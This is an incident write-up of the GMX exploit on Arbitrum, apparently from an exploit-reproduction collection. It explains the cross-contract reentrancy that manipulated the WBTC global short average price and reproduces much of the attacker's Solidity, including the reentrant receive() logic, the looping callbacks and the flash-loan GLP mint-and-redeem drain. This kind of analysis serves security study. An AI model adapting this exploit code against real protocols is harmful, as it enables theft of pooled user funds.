# GMX Protocol

- **Type:** Exploit
- **Network:** Arbitrum
- **Total lost:** ~ 42 million USD
- **Category:** Reentrancy / Business Logic
- **Vulnerable contracts:**
    - [Vault](https://arbiscan.io/address/0x489ee077994b6658eafa855c308275ead8097c4a#code)
    - [GLP Manager](https://arbiscan.io/address/0x321f653eed006ad1c29d174e17d96351bde22649#code)

- **Tokens Lost**
    - ~ 9749629 USDC
    - ~ 88 WBTC
    - ~ 3205 WETH
    - ~ 187343 USDC.E
    - ~ 23800 LINK
    - ~ 65479 UNI
    - ~ 1343601 USDT
    - ~ 10548626 FRAX
    - ~ 1338385 DAI

- **Attack transactions:**

    - Setup:

        - Exploit contract calls createIncreaseOrder
        createIncreaseOrder 0
        https://arbiscan.io/tx/0x0b8cd648fb585bc3d421fc02150013eab79e211ef8d1c68100f2820ce90a4712

        - Keeper executes increase order
        executeIncreaseOrder 0
        https://arbiscan.io/tx/0x28a000501ef8e3364b0e7f573256b04b87d9a8e8173410c869004b987bf0beef

        - Exploit contract calls createDecreaseOrder
        createDecreaseOrder 0
        https://arbiscan.io/tx/0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af

        - Keeper executes decrease order and initiates the loop
        executeDecreaseOrder 0
        https://arbiscan.io/tx/0x1f00da742318ad1807b6ea8283bfe22b4a8ab0bc98fe428fbfe443746a4a7353

        - Updater sets prices, executes order and creates a new decrease order
        setPricesWithBitsAndExecute / createDecreaseOrder 1
        https://arbiscan.io/tx/0x222cdae82a8d28e53a2bddfb34ae5d1d823c94c53f8a7abc179d47a2c994464e

        - Loop continues until the exploit contract executes final attack

    - Main Attack: 
    
        - Keeper executes decrease order 5
        executeDecreaseOrder 5 (MAIN EXPLOIT TX)
        https://arbiscan.io/tx/0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef

    - Fund Withdrawal:

        - Exploiter withdraws funds from the exploit contract
        https://arbiscan.io/tx/0x86486dceddcf581d43ab74e2ca381d4a8ee30a405ae17a81f4615986c0c75419


- **Attacker Addresses:**

    - Exploiter's EOA: [0xDF3340A436c27655bA62F8281565C9925C3a5221](https://arbiscan.io/address/0xdf3340a436c27655ba62f8281565c9925c3a5221)

    - Attacker's Smart Contract: [0x7d3bd50336f64b7a473c51f54e7f0bd6771cc355](https://arbiscan.io/address/0x7D3BD50336f64b7A473C51f54e7f0Bd6771cc355)

- **Attack Block:**: 355880237
- **Date:** July 9, 2025
- **Reproduce:** `forge test --match-contract Exploit_GMX -vvv --via-ir`

## Step-by-step Overview


## Detailed Description

The GMX protocol exploit was a sophisticated multi-transaction attack that leveraged a cross-contract reentrancy vulnerability to manipulate the average short price of an asset, ultimately leading to the draining of approximately $42 million USD from the GLP vault.

The root cause of the exploit was a reentrancy vulnerability within the `OrderBook.sol` contract, specifically at the `_transferOutETH` function (https://github.com/gmx-io/gmx-contracts/blob/master/contracts/core/OrderBook.sol#L874). While OrderBook.sol utilizes a nonReentrant modifier, this modifier only prevents reentrancy within the same contract. The attacker exploited this limitation by re-entering the `Vault` contract directly from a malicious contract, bypassing intended access controls and business logic.

Under normal operation, the `increasePosition` function in the `Vault` contract is designed to be called exclusively by the `PositionRouter` and `PositionManager` contracts. These intermediary contracts are crucial for correctly calculating and updating the average short price, which directly influences the price of GLP (GMX Liquidity Provider token) by affecting the pending Profit and Loss (PnL) calculation.

The attacker's strategy involved setting up a malicious contract that would be used to interact with the GMX protocol, and had custom logic in the `receive` function to handle incoming Ether and execute the exploit logic.

```solidity
contract ExploitSC {
    function createIncreaseOrder() external payable {
        //...
    }

    function createDecreaseOrder() external payable {
        //...
    }

    receive() external payable {
        //...
    }

    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external{
       //...
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        //...
    }
}
```

Following this, he funded the contract with some USDC and used it to initiate an order for a long position by calling `createIncreaseOrder`, which was fulfilled by an off-chain keeper bot in another transaction.

After that, the attacker created a decrease order for the long position, which was also filled by the keeper bot. 

A crucial factor for the exploit lay in the `executeDecreaseOrder` function of the `PositionManager` contract, which the keeper called. Within this function, leverage is explicitly enabled via `ITimelock(timelock).enableLeverage(_vault)` before the call to `IOrderBook(orderBook).executeDecreaseOrder`, and then disabled after it with `ITimelock(timelock).disableLeverage(_vault)`.


```solidity
function executeDecreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external onlyOrderKeeper {
    //...

    // should be called strictly before position is updated in Vault
    IShortsTracker(shortsTracker).updateGlobalShortData(_account, collateralToken, indexToken, isLong, sizeDelta, markPrice, false);

    ITimelock(timelock).enableLeverage(_vault);
    IOrderBook(orderBook).executeDecreaseOrder(_account, _orderIndex, _feeReceiver);
    ITimelock(timelock).disableLeverage(_vault);

    _emitDecreasePositionReferral(_account, sizeDelta);
}
```

During this transaction, when the ETH refund was triggered in the `OrderBook` contract to the malicious contract, it involved an external arbitrary call that lacked the necessary gas limits or other constraints that would have prevented a re-entrant call. When  the `OrderBook` contract executed the `_transferOutETH` function, it called  `sendValue`, which performed a low-level call to the recipient (the attacker's malicious contract).

```solidity
function _transferOutETH(uint256 _amountOut, address payable _receiver) private {
    IWETH(weth).withdraw(_amountOut);
    _receiver.sendValue(_amountOut);
}

function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
}
```

This `recipient.call{ value: amount }("")` directly invoked the malicious contract's `receive()` function, and because this was called during the execution of `IOrderBook(orderBook).executeDecreaseOrder`, leverage in the `Vault` was still enabled. 

The `receive()` function had conditional logic that depended on the current ratio between `wbtcMaxPrice` and `wbtcGlobalShortAveragePrice`.

```solidity
receive() external payable {
    uint256 wbtcGlobalShortAveragePrice = GLP_MANAGER
        .getGlobalShortAveragePrice(address(WBTC));

    uint256 wbtcMaxPrice = VAULT.getMaxPrice(address(WBTC));

    require(
        wbtcMaxPrice > wbtcGlobalShortAveragePrice,
        "Max price is not greater than global short average price"
    );

    if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
        // ...
    } else {
        //...
}
```

When the price ratio condition was not met, the `receive()` function would execute the else branch:

```solidity
if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
    //...
} else {
    uint256 usdcBalance = USDC.balanceOf(address(this));
    USDC.transfer(
        address(VAULT),
        usdcBalance
    );

    uint256 maxPrice = VAULT.getMaxPrice(address(USDC));
    uint256 sizeDelta = (maxPrice * usdcBalance * 30) / (10 ** 6);
    
    VAULT.increasePosition(
        address(this),
        address(USDC),
        address(WBTC),
        sizeDelta,
        false
    );

    IVault.Position memory position = VAULT.getPosition(
        address(this),
        address(USDC),
        address(WBTC),
        false
    );

    ROUTER.approvePlugin(address(POSITION_ROUTER));

    address[] memory path = new address[](1);
    path[0] = address(USDC);

    POSITION_ROUTER.createDecreasePosition{value: 3000000000000000}(
        path,
        address(WBTC),
        0, // collateralDelta
        position.size, // sizeDelta
        false, // isLong
        address(this), // receiver
        120000000000000000000000000000000000, // acceptablePrice
        0, // minOut
        3000000000000000, // executionFee
        false, // withdrawETH
        address(this) // callbackTarget
    );
}
```

Here, it transfers USDC to the `Vault` and invokes `VAULT.increasePosition` while leverage was still enabled. This allowed the attacker to create positions with manipulated leverage, bypassing the `PositionRouter` and `PositionManager` contracts. This direct call was instrumental in manipulating the `wbtcGlobalShortAveragePrice` without undergoing the proper calculation and update mechanisms. Subsequently, the `receive()` function would create a new `decreasePosition` order, setting the callback target back to the malicious contract itself.

The exploit then transitioned into a recursive loop. The `UPDATER` periodically invoked the `setPricesWithBitsAndExecute` function in the `FastPriceFeed` contract, which, as part of its operation, executed pending `decreasePosition` orders, including those newly created by the malicious contract.

```solidity
function setPricesWithBitsAndExecute(
    uint256 _priceBits,
    uint256 _timestamp,
    uint256 _endIndexForIncreasePositions,
    uint256 _endIndexForDecreasePositions,
    uint256 _maxIncreasePositions,
    uint256 _maxDecreasePositions
) external onlyUpdater {
    _setPricesWithBits(_priceBits, _timestamp);

    //...

    _positionRouter.executeIncreasePositions(_endIndexForIncreasePositions, payable(msg.sender));
    _positionRouter.executeDecreasePositions(_endIndexForDecreasePositions, payable(msg.sender));
}
```

Upon the execution of `executeDecreasePosition` in the `PositionRouter` contract by the UPDATER, the `_callRequestCallback` function was called and the callback was directed back to the malicious contract:

```solidity
function executeDecreasePosition(bytes32 _key, address payable _executionFeeReceiver) public nonReentrant returns (bool) {
    //...

    uint256 amountOut = _decreasePosition(request.account, request.path[0], request.indexToken, request.collateralDelta, request.sizeDelta, request.isLong, address(this), request.acceptablePrice);

    //...

    _callRequestCallback(request.callbackTarget, _key, true, false);

    return true;
}
```

This callback, in turn, generated yet another `decreaseOrder`, perpetuating a cycle.

```solidity
function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external{
    require(msg.sender == address(POSITION_ROUTER), "Unauthorized callback");

    ORDER_BOOK.createDecreaseOrder{value: 3000000000000000}(
        address(WETH),
        53106400000000000000000000000000,
        address(WETH),
        26517133600000000000000000000000,
        true,
        1500000000000000000000000000000000,
        true
    );
}
```

This continuous creation and execution of decreaseOrders between the UPDATER and the KEEPER combined with the direct calls to `increasePosition` in the `Vault` allowed the attacker to systematically drive down the `wbtcGlobalShortAveragePrice` from its legitimate value of approximately $109,505.77 to an artificially depressed $1,913.70. A crucial oversight was that while `globalShortSizes` (the total short position size) was correctly updated by the attacker's actions, the averagePrice within the `getGlobalShortAveragePrice` function, used for AUM calculation, remained uncorrected for these "virtual" short positions opened via reentrancy. This created a deceptive impression within the system that existing short positions were opened at a much lower (manipulated) average price, leading to an artificially inflated perceived AUM (Assets Under Management) for the GLP.

After some iterations of this loop, the ratio between `wbtcMaxPrice` and `wbtcGlobalShortAveragePrice` reached a point where it was greater than 50, triggering the first branch of the `receive()` function. This allowed the attacker to execute a final withdrawal of funds from the `Vault`, draining all the assets. The first step of this final withdrawal involved a flash loan from the Uniswap V3 pool, which was used to get the necessary funds.

```solidity
receive() external payable {
    uint256 wbtcGlobalShortAveragePrice = GLP_MANAGER
        .getGlobalShortAveragePrice(address(WBTC));

    uint256 wbtcMaxPrice = VAULT.getMaxPrice(address(WBTC));

    require(
        wbtcMaxPrice > wbtcGlobalShortAveragePrice,
        "Max price is not greater than global short average price"
    );

    if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
        uint256 amount0 = 0;
        uint256 amount1 = 7538567619570;

        bytes
            memory data = hex"0000000000000000000000000000000000000000000000000000016639c6c3f200000000000000000000000000000000000000000000000000000574fbde6000";

        WETH_USDC_POOL.flash(address(this), amount0, amount1, data);
    } else {
        //...
    }
}
```

Within the `uniswapV3FlashCallback` function, the attacker executed the core draining logic. The attacker minted GLP at its then-fair market price. Immediately after, a massive short position was opened. Due to the severely manipulated average short price, the system's calculations reported an astronomical "short loss" for this newly opened position. This fabricated loss catastrophically inflated the calculated AUM for GLP.

This inflated AUM, directly influenced by the short losses, caused the GLP price to increase. The attacker then proceeded to redeem the previously minted GLP at this drastically inflated price. It iterated over multiple tokens held in the vault calculating the available amounts and redeeming GLP for each, effectively draining the assets from the pool.


```solidity
function uniswapV3FlashCallback(
    uint256 fee0,
    uint256 fee1,
    bytes calldata data
) external {
    (uint256 value1, uint256 value2) = abi.decode(data, (uint256, uint256));

    USDC.approve(address(GLP_MANAGER), value2);
    REWARD_ROUTER_V2.mintAndStakeGlp(address(USDC), value2, 0, 0);
    USDC.transfer(address(VAULT), value1);

    uint256 maxPrice = VAULT.getMaxPrice(address(USDC));
    uint256 sizeDelta = (maxPrice * value1 * 10) / (10 ** 6);

    VAULT.increasePosition(
        address(this),
        address(USDC),
        address(WBTC),
        sizeDelta,
        false
    );

    for (uint256 i = 0; i < tokens.length; i++) {
        IERC20 token = IERC20(tokens[i]);
        uint256 tokenDecimal = tokenDecimals[i];
        uint256 aum = GLP_MANAGER.getAum(false);
        uint256 glpTotalSupply = GLP.totalSupply();
        uint256 reservedAmount = VAULT.reservedAmounts(address(token));
        uint256 poolAmount = VAULT.poolAmounts(address(token));
        uint256 tokenMinPrice = VAULT.getMinPrice(address(token));

        // Calculate the value of the 'available' token amount in a normalized format (e.g., USD equivalent)
        // (poolAmount - reservedAmount) gives the truly available liquidity for the token.
        // Multiplying by tokenMinPrice and dividing by 10^tokenDecimal converts this into a standard value unit,
        // effectively removing the token's specific decimal scaling.
        uint256 availableTokenValueNormalized = (tokenMinPrice *
            (poolAmount - reservedAmount)) / (10 ** tokenDecimal);

        // Apply a small cut (0.1%) to the calculated value
        uint256 adjustedAvailableTokenValue = (availableTokenValueNormalized *
                900) / 1000;

        // Calculate the amount of GLP tokens that corresponds to the adjusted available token value.
        // This uses the standard GMX formula: (AssetValue / AUM) * GLP_TotalSupply = Redeemable GLP Amount
        uint256 glpAmountToRedeem = (adjustedAvailableTokenValue *
            glpTotalSupply) / aum;


        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(token),
            glpAmountToRedeem,
            0,
            address(this)
        );
    }

    // ... Further position manipulation and GLP mint/redeem
    
    // Repay the flashloan
    USDC.transfer(msg.sender, value1 + value2 + fee1);
}
```

## Possible mitigations

1. 

## Sources and references

- [Rekt](https://rekt.news/gmx-rekt)
- [GMX Tweet](https://x.com/gmx_io/status/1943336664102756471?s=46)